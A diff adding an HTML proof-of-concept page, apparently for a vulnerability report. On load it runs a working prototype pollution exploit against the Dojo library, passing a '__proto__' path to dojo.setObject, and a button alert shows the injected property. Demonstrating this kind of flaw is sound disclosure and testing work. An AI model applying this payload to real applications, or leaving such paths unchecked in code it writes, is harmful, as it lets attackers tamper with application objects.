@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dojo Prototype Pollution Example</title>
+    <script src="node_modules/dojo/dojo.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #00aaff, #0044cc);
+            color: white;
+            margin: 0;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.5);
+        }
+        h1 {
+            text-align: center;
+        }
+        .info {
+            margin-bottom: 20px;
+            font-size: 1.2em;
+        }
+        .alert-btn {
+            padding: 10px 20px;
+            background-color: #00cc88;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .alert-btn:hover {
+            background-color: #008855;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Dojo Prototype Pollution Demo</h1>
+        <p class="info">This demonstrates a prototype pollution vulnerability using Dojo. Click the button below to see the result.</p>
+        <button class="alert-btn">Show Vulnerability</button>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const obj = {};
+
+            // Polluting the prototype using Dojo's setObject method
+            dojo.setObject("__proto__.vuln", "polluted!", obj);
+
+            // Adding click event to the button to demonstrate the vulnerability
+            document.querySelector('.alert-btn').addEventListener('click', function() {
+                alert("anything".vuln); // Should alert "polluted!"
+            });
+        });
+    </script>
+</body>
+</html>
